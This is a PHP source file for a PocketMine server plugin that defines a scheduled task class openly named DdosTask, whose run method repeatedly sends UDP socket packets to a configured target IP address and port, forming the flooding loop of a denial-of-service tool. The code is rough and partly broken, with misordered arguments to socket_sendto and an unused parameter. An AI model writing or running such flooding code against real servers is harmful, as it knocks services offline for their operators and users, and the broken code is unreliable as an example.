<?php

namespace DDOS\Shedule;

use pocketmine\scheduler\Task;

class DdosTask extends Task {

    /** @var string */
    public string $ip;

    /** @var string */
    public string $port;

    public $sock;
    public $bytes;
    public $buffer;

    /**
     * @param $sock
     * @param $bytes
     * @param $buffer
     * @param $flag
     * @param string $ip
     * @param string $port
     */
    public function __construct($sock, $bytes, $buffer, $flag = 0, string $ip, string $port){
        $this->ip = $ip;
        $this->port = $port;
        $this->sock = $sock;
        $this->bytes = $bytes;
        $this->buffer = $buffer;
    }

    /**
     * @return void
     */
    public function onRun() : void {
        var_dump(socket_sendto($this->sock, $this->bytes, $this->buffer,0, $this->ip, $this->port));
        socket_sendto($this->sock, $this->bytes, $this->buffer,0, $this->ip, $this->port);
    }

}
